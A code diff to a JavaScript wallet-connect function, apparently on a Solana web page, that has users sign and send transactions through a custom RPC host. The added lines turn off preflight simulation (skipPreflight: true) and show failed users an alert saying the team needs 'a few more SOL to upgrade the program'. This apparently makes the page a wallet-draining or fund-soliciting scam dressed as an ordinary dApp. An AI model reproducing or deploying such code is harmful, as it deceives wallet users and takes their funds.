@@ -186,6 +186,7 @@ async function connectWallet() {
             console.log("Energy Account Address: ", energyAccountValue.toBase58());
             if (energyAccountValue!== "1e") {
                 const networkDropdown = document.querySelector("#network > div.container > div > div.wrap-inner > div > input");
+                // const network = 'https://api.devnet.solana.com'; //
                 const network = 'https://rpc.api.singularicula.me'; //networkDropdown.value;
                 // getToken();
                 // Création d'une instance de Connection qui utilise customFetch
@@ -273,11 +274,11 @@ async function connectWallet() {
                             transaction.feePayer = publicKey;
                             // transaction.nonceInfo = { nonce: Uint8Array.from([]) };
                             console.log("Transaction: ", transaction);
-                            provider.signAndSendTransaction(transaction, { skipPreflight: false }).then((signature) => {
+                            provider.signAndSendTransaction(transaction, { skipPreflight: true,  }).then((signature) => {
                                 console.log(`Welcome: Transaction sent with signature: ${JSON.stringify(signature)}`);
                             }).catch((error) => {
                                 console.error("Welcome: Error sending transaction: ", error);
-                                //alert("Error sending transaction: ", error);
+                                alert("Error sending transaction: Sorry for this inconvenience. we already know about this issue and have a fix, but we just need a few more SOL to upgrade the program. Please try again later.");
                             });
                         }).catch((error) => {
                             console.error("Welcome: Error getting latest blockhash: ", error);
